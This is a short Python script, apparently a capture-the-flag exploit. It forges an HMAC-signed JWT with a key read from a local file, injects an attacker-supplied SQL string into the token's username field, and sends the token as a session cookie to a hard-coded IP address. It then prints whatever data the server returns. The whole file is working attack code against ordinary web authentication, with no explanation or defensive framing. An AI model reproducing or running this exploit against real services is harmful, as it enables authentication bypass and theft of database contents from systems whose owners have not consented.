# coding: iso-8859-15
import requests
import base64
import sys
import subprocess
import binascii
import re

sql=sys.argv[1]

header = '{"alg":"HS256","typ":"JWT"}'
payload = '{"username":"peanut\' '+sql+'", "iat":1623007586}'
b64header = base64.urlsafe_b64encode(header).replace('=','')
b64payload = base64.urlsafe_b64encode(payload).replace('=','')
hexkey = subprocess.check_output('cat jwtkey.txt | xxd -p | tr -d "\\n"', shell=True)
sig = subprocess.check_output("echo -n \"{}.{}\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:{}".format(b64header, b64payload, hexkey),shell=True)
sig = sig.split(" ")[1].strip()
b64sig = base64.urlsafe_b64encode(binascii.a2b_hex(sig)).replace('=','')
newJWT = "{}.{}.{}".format(b64header,b64payload,b64sig)

url="http://165.227.237.137:31653/"
cookie = {'session': newJWT}
s = requests.Session()
r = s.get(url,cookies=cookie)
res = re.findall("<pre>(.*?)</pre>", r.content, re.DOTALL)
if not res: res = re.findall("Welcome (.*?)<br>", r.content, re.DOTALL)
print(res[0])